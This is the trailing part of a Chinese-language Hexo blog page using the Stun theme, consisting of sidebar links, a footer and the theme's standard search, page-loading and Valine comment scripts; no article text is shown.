class="sidebar-ov-author__text">生命不息，折腾不止！</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/zhisenyu" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://www.youtube.com/channel/UCarZXyGTzWssmNANey0TC3g" target="_blank" rel="noopener" data-popover="Youtube" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-youtube"></i></span></a><a class="sidebar-ov-social-item" href="z405454586" target="_blank" rel="noopener" data-popover="微信" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weixin"></i></span></a><a class="sidebar-ov-social-item" href="tencent://message?uin=405454586" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">25</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">8</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Jlan</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.0.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>来自DarkFlow战队，暗流涌动</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="150" zIndex="-1"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
+  var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
+  // 加载进度条的计时器
+  var loadingTimer = null;
+
+  // 重置页面 Y 方向上的滚动偏移量
+  document.addEventListener('pjax:send', function () {
+    $('.header-nav-menu').removeClass('show');
+    if (CONFIG.pjax && CONFIG.pjax.avoidBanner) {
+      $('html').velocity('scroll', {
+        duration: 500,
+        offset: $('#header').height(),
+        easing: 'easeInOutCubic'
+      });
+    }
+
+    var loadingBarWidth = 20;
+    var MAX_LOADING_WIDTH = 95;
+
+    $('.loading-bar').addClass('loading');
+    $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    clearInterval(loadingTimer);
+    loadingTimer = setInterval(function () {
+      loadingBarWidth += 3;
+      if (loadingBarWidth > MAX_LOADING_WIDTH) {
+        loadingBarWidth = MAX_LOADING_WIDTH;
+      }
+      $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    }, 500);
+  }, false);
+
+  window.addEventListener('pjax:complete', function () {
+    clearInterval(loadingTimer);
+    $('.loading-bar__progress').css('width', '100%');
+    $('.loading-bar').removeClass('loading');
+    setTimeout(function () {
+      $('.loading-bar__progress').css('width', '0');
+    }, 400);
+    $('link[rel=prefetch], script[data-pjax-rm]').each(function () {
+      $(this).remove();
+    });
+    $('script[data-pjax], #pjax-reload script').each(function () {
+      $(this).parent().append($(this).remove());
+    });
+
+    if (Stun.utils.pjaxReloadBoot) {
+      Stun.utils.pjaxReloadBoot();
+    }
+    if (Stun.utils.pjaxReloadScroll) {
+      Stun.utils.pjaxReloadScroll();
+    }
+    if (Stun.utils.pjaxReloadSidebar) {
+      Stun.utils.pjaxReloadSidebar();
+    }
+    if (false) {
+      if (Stun.utils.pjaxReloadHeader) {
+        Stun.utils.pjaxReloadHeader();
+      }
+      if (Stun.utils.pjaxReloadScrollIcon) {
+        Stun.utils.pjaxReloadScrollIcon();
+      }
+      if (Stun.utils.pjaxReloadLocalSearch) {
+        Stun.utils.pjaxReloadLocalSearch();
+      }
+    }
+  }, false);
+}, false);</script><div id="pjax-reload"><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script></div><script src="https://cdn.jsdelivr.net/npm/leancloud-storage@latest/dist/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script data-pjax="">function loadValine () {
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var guest_info = 'nick,mail,link';
+
+  guest_info = guest_info.split(',').filter(function(item) {
+    return GUEST_INFO.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#valine-container',
+    appId: 'PRycUaQbxE5mebmnKTjtaRJg-gzGzoHsz',
+    appKey: 'jGyP9zr05MTuqHpWaIkgYW4h',
+    notify: true,
+    verify: true,
+    placeholder: '写点什么吧',
+    avatar: 'mp',
+    meta: guest_info,
+    pageSize: '10' || 10,
+    visitor: true,
+    recordIP: true,
+    lang: 'zh-cn,en' || 'zh-cn',
+    path: window.location.pathname
+  });
+}
+
+if (true) {
+  loadValine();
+} else {
+  window.addEventListener('DOMContentLoaded', loadValine, false);
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
